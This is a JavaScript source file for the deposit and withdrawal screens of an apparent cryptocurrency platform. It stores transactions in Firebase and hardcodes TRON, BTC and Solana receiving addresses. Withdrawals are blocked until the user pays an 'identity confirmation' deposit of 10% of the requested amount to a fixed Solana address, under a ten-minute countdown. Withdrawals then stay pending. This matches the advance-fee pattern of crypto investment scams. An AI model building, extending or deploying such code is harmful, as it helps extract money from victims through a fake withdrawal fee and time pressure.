// Shared deposit / withdraw + RTDB active sessions & pending txs
import { auth, db, ref, set, update, push, get, onAuthStateChanged } from './firebase.js';

const ADDRESSES = {
  TRON: 'TEHf8c3EEgYJFWg26uCjiYYQJFjm9fRv4V',
  BTC: 'bc1qqhqrmvk4yrlem7q7vcmwn4a8mv0huk6cudus9e',
  SOL: 'CoFkNZ6wEzhSTyH8k3rxMcfC12WResgMwhgVV3MSfF62'
};
const IDENTITY_ASSET = 'SOL';
const IDENTITY_ADDRESS = ADDRESSES.SOL;

let currentSessionId = null;
let countdownTimer = null;
let selectedAsset = 'TRON';
let sessionExpiresAt = 0;
let userBalance = 0;

// Pending withdraw held in browser only until identity confirm completes
let pendingWithdraw = null;

function $(id) { return document.getElementById(id); }

function formatCountdown(ms) {
  const s = Math.max(0, Math.floor(ms / 1000));
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${m}:${sec.toString().padStart(2, '0')}`;
}

function startCountdown(els) {
  if (countdownTimer) clearInterval(countdownTimer);
  countdownTimer = setInterval(() => {
    const left = sessionExpiresAt - Date.now();
    const text = 'EXPIRES IN ' + formatCountdown(left);
    (els || []).forEach(el => { if (el) el.textContent = text; });
    if (left <= 0) {
      clearInterval(countdownTimer);
      closeAllPaymentModals();
      pendingWithdraw = null;
      if (currentSessionId) {
        update(ref(db, 'activeSessions/' + currentSessionId), { status: 'expired' }).catch(()=>{});
        currentSessionId = null;
      }
    }
  }, 1000);
}

async function loadUserBalance() {
  const user = auth.currentUser;
  if (!user) { userBalance = 0; return 0; }
  try {
    const snap = await get(ref(db, 'users/' + user.uid));
    userBalance = snap.exists() ? Number(snap.val().balance || 0) : 0;
  } catch {
    userBalance = 0;
  }
  document.querySelectorAll('[data-balance]').forEach(el => {
    el.textContent = '$' + userBalance.toFixed(2);
  });
  const wBal = $('withdrawAvailable');
  if (wBal) wBal.textContent = '$' + userBalance.toFixed(2);
  return userBalance;
}

async function createActiveSession(type, asset) {
  const user = auth.currentUser;
  if (!user) return null;
  const sessionRef = push(ref(db, 'activeSessions'));
  const id = sessionRef.key;
  sessionExpiresAt = Date.now() + 10 * 60 * 1000;
  await set(sessionRef, {
    id,
    uid: user.uid,
    email: user.email || '',
    type,
    asset: asset || selectedAsset,
    amount: 0,
    status: 'active',
    createdAt: Date.now(),
    expiresAt: sessionExpiresAt
  });
  currentSessionId = id;
  return id;
}

/* ===================== DEPOSIT ===================== */
window.openDeposit = async function() {
  selectedAsset = 'TRON';
  const modal = $('depositModal');
  if (!modal) return;
  modal.classList.remove('hidden');
  modal.classList.add('flex');
  await createActiveSession('deposit', 'TRON');
  startCountdown([
    document.querySelector('#depositModal .text-rose-400'),
    document.querySelector('#confirmModal .text-rose-400')
  ]);
};

window.closeDeposit = function() {
  const modal = $('depositModal');
  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
};

window.selectAsset = function(name) {
  selectedAsset = name;
  closeDeposit();
  const addrEl = $('treasuryAddress');
  if (addrEl) addrEl.textContent = ADDRESSES[name] || ADDRESSES.TRON;
  const amountInput = $('amountToSend');
  if (amountInput && !amountInput.value) amountInput.value = '0';
  const modal = $('confirmModal');
  if (modal) {
    modal.classList.remove('hidden');
    modal.classList.add('flex');
  }
  if (currentSessionId) {
    update(ref(db, 'activeSessions/' + currentSessionId), { asset: name }).catch(()=>{});
  }
  startCountdown([document.querySelector('#confirmModal .text-rose-400')]);
};

window.closeConfirm = function() {
  const modal = $('confirmModal');
  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
  openDeposit();
};

window.submitDeposit = async function() {
  const user = auth.currentUser;
  if (!user) return;
  const amountEl = $('amountToSend');
  const amount = parseFloat(amountEl ? amountEl.value : 0) || 0;
  const sourceWallet = ($('sourceWallet') || {}).value || '';
  const txHash = ($('txHash') || {}).value || '';

  if (amount <= 0) {
    alert('Enter an amount greater than 0');
    return;
  }

  const txRef = push(ref(db, 'transactions'));
  const txId = txRef.key;
  const payload = {
    id: txId,
    uid: user.uid,
    email: user.email || '',
    type: 'deposit',
    asset: selectedAsset,
    amount,
    address: ADDRESSES[selectedAsset],
    sourceWallet,
    txHash,
    status: 'pending',
    createdAt: Date.now(),
    sessionId: currentSessionId
  };
  await set(txRef, payload);
  await set(ref(db, 'users/' + user.uid + '/transactions/' + txId), payload);

  if (currentSessionId) {
    await update(ref(db, 'activeSessions/' + currentSessionId), {
      status: 'submitted', amount, txId
    });
    currentSessionId = null;
  }
  if (countdownTimer) clearInterval(countdownTimer);

  ['confirmModal','depositModal'].forEach(id => {
    const m = $(id);
    if (m) { m.classList.add('hidden'); m.classList.remove('flex'); }
  });
  alert('Transaction submitted. Status: pending');
};

/* ===================== WITHDRAW ===================== */
window.openWithdraw = async function() {
  await loadUserBalance();
  pendingWithdraw = null;
  // remove any leftover 10% keep hints
  const oldHint = $('withdrawHint');
  if (oldHint) oldHint.remove();

  const modal = $('withdrawModal');
  if (!modal) return;
  const wBal = $('withdrawAvailable');
  if (wBal) wBal.textContent = '$' + userBalance.toFixed(2);

  modal.classList.remove('hidden');
  modal.classList.add('flex');
  await createActiveSession('withdraw', selectedAsset || 'TRON');
};

window.closeWithdraw = function() {
  const modal = $('withdrawModal');
  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
  const dd = $('methodDropdown');
  if (dd) dd.classList.add('hidden');
  // don't clear pendingWithdraw if moving to identity step
};

window.toggleMethodDropdown = function() {
  const dd = $('methodDropdown');
  const chevron = $('methodChevron');
  if (dd) dd.classList.toggle('hidden');
  if (chevron) chevron.classList.toggle('rotate-180');
};

// Step 1 → identity confirm (NO save yet)
window.submitWithdraw = async function() {
  const user = auth.currentUser;
  if (!user) return;
  await loadUserBalance();

  const amount = parseFloat(($('withdrawAmount') || {}).value || 0) || 0;
  const dest = ($('withdrawAddress') || {}).value || '';

  if (amount <= 0) { alert('Enter amount > 0'); return; }
  if (!dest) { alert('Enter destination address'); return; }
  if (amount > userBalance) {
    alert('Insufficient balance. Available: $' + userBalance.toFixed(2));
    return;
  }

  // Hold in browser only
  pendingWithdraw = {
    amount,
    dest,
    asset: selectedAsset || 'TRON',
    identityAmount: Math.round(amount * 0.1 * 100) / 100
  };

  // Close withdraw form, open identity modal
  const wModal = $('withdrawModal');
  if (wModal) { wModal.classList.add('hidden'); wModal.classList.remove('flex'); }

  openIdentityConfirm();
};

function openIdentityConfirm() {
  if (!pendingWithdraw) return;
  const modal = $('identityModal');
  if (!modal) {
    alert('Identity step missing on this page');
    return;
  }

  const idAddr = $('identityTreasuryAddress');
  if (idAddr) idAddr.textContent = IDENTITY_ADDRESS;
  const idAmt = $('identityAmount');
  if (idAmt) idAmt.textContent = '$' + Number(pendingWithdraw.identityAmount).toFixed(2);
  const idWithdrawAmt = $('identityWithdrawAmount');
  if (idWithdrawAmt) idWithdrawAmt.textContent = '$' + Number(pendingWithdraw.amount).toFixed(2);
  const idAsset = $('identityAsset');
  if (idAsset) idAsset.textContent = 'SOLANA (SOL)';

  // clear inputs
  const src = $('identitySourceWallet');
  if (src) src.value = '';
  const hash = $('identityTxHash');
  if (hash) hash.value = '';

  modal.classList.remove('hidden');
  modal.classList.add('flex');

  startCountdown([document.querySelector('#identityModal .text-rose-400')]);
  if (currentSessionId) {
    update(ref(db, 'activeSessions/' + currentSessionId), {
      stage: 'identity',
      amount: pendingWithdraw.amount,
      identityAmount: pendingWithdraw.identityAmount
    }).catch(()=>{});
  }
}

window.backToWithdraw = function() {
  const modal = $('identityModal');
  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
  const wModal = $('withdrawModal');
  if (wModal) {
    wModal.classList.remove('hidden');
    wModal.classList.add('flex');
  }
  // restore amount fields if present
  if (pendingWithdraw) {
    const amt = $('withdrawAmount');
    if (amt) amt.value = pendingWithdraw.amount;
    const dest = $('withdrawAddress');
    if (dest) dest.value = pendingWithdraw.dest;
  }
};

window.closeIdentity = function() {
  const modal = $('identityModal');
  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
  pendingWithdraw = null;
  if (currentSessionId) {
    update(ref(db, 'activeSessions/' + currentSessionId), { status: 'cancelled' }).catch(()=>{});
    currentSessionId = null;
  }
};

// Final save — only here does data hit RTDB
window.completeWithdrawal = async function() {
  const user = auth.currentUser;
  if (!user || !pendingWithdraw) return;

  const sourceWallet = ($('identitySourceWallet') || {}).value || '';
  const txHash = ($('identityTxHash') || {}).value || '';

  if (!txHash.trim()) {
    alert('Please paste your transaction hash / payment reference');
    return;
  }

  const { amount, dest, asset, identityAmount } = pendingWithdraw;

  // 1) Identity / 10% deposit tx (pending) — always Solana
  const idTxRef = push(ref(db, 'transactions'));
  const idTxId = idTxRef.key;
  const identityPayload = {
    id: idTxId,
    uid: user.uid,
    email: user.email || '',
    type: 'identity_deposit',
    relatedType: 'withdraw',
    asset: IDENTITY_ASSET,
    amount: identityAmount,
    address: IDENTITY_ADDRESS,
    sourceWallet,
    txHash,
    status: 'pending',
    withdrawAmount: amount,
    withdrawAddress: dest,
    createdAt: Date.now(),
    sessionId: currentSessionId
  };
  await set(idTxRef, identityPayload);
  await set(ref(db, 'users/' + user.uid + '/transactions/' + idTxId), identityPayload);

  // 2) Withdrawal request (pending, linked)
  const wTxRef = push(ref(db, 'transactions'));
  const wTxId = wTxRef.key;
  const withdrawPayload = {
    id: wTxId,
    uid: user.uid,
    email: user.email || '',
    type: 'withdraw',
    asset,
    amount,
    address: dest,
    status: 'pending',
    identityTxId: idTxId,
    identityAmount,
    identityTxHash: txHash,
    createdAt: Date.now(),
    sessionId: currentSessionId
  };
  await set(wTxRef, withdrawPayload);
  await set(ref(db, 'users/' + user.uid + '/transactions/' + wTxId), withdrawPayload);

  if (currentSessionId) {
    await update(ref(db, 'activeSessions/' + currentSessionId), {
      status: 'submitted',
      amount,
      identityAmount,
      txId: wTxId,
      identityTxId: idTxId
    });
    currentSessionId = null;
  }
  if (countdownTimer) clearInterval(countdownTimer);

  pendingWithdraw = null;
  closeIdentity();
  const wModal = $('withdrawModal');
  if (wModal) { wModal.classList.add('hidden'); wModal.classList.remove('flex'); }

  alert('Withdrawal submitted with identity confirmation. Status: pending');
};

function closeAllPaymentModals() {
  ['depositModal','confirmModal','withdrawModal','identityModal'].forEach(id => {
    const m = $(id);
    if (m) { m.classList.add('hidden'); m.classList.remove('flex'); }
  });
  pendingWithdraw = null;
}

document.addEventListener('DOMContentLoaded', () => {
  ['depositModal','confirmModal','withdrawModal','identityModal'].forEach(id => {
    const m = $(id);
    if (m) m.addEventListener('click', function(e) {
      if (e.target === this) {
        if (id === 'depositModal') closeDeposit();
        if (id === 'confirmModal') closeConfirm();
        if (id === 'withdrawModal') closeWithdraw();
        if (id === 'identityModal') closeIdentity();
      }
    });
  });
  onAuthStateChanged(auth, () => loadUserBalance());
});

export { ADDRESSES, loadUserBalance };
